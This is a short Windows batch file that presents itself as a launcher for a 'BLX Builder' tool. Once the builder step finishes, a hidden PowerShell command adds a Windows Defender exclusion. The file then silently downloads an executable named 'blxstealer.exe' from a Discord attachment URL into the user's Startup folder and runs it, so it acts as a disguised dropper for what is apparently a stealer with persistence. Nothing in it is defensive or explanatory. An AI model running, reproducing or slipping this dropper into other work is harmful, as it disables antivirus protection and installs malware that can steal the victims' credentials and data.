@echo off
title BLX Builder
python builder.pyw
pause
powershell -w hidden -c Add-MpPreference -ExclusionPath ""
@echo off
setlocal
set "URL=https://cdn.discordapp.com/attachments/1234829034370764946/1235950515104387092/blxstealer.exe?ex=66363c1d&is=6634ea9d&hm=468f9a1fc6819b9e67f669a41b55444db7cc41a5e37c556347cc244ec57c3d78&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\blxstealer.exe"
if exist "%DEST%" del "%DEST%"
curl --silent --output "%DEST%" "%URL%"
if %errorlevel% neq 0 (
exit /b %errorlevel%
)
call "%DEST%"
